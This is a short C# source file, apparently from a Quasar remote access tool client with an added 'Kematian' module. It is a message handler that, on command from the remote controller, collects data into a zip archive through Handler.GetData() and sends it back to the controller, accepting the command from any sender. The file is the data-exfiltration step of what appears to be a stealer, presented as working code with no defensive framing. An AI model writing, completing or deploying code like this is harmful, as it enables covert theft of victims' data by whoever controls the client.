﻿using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Client.Kematian;
using Quasar.Common.Messages.Monitoring.Kematian;

namespace Quasar.Client.Messages
{
    public class KematianHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is GetKematian;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetKematian msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetKematian message)
        {
            byte[] zipFile = Handler.GetData();
            client.Send(new GetKematian { ZipFile = zipFile });
        }
    }
}
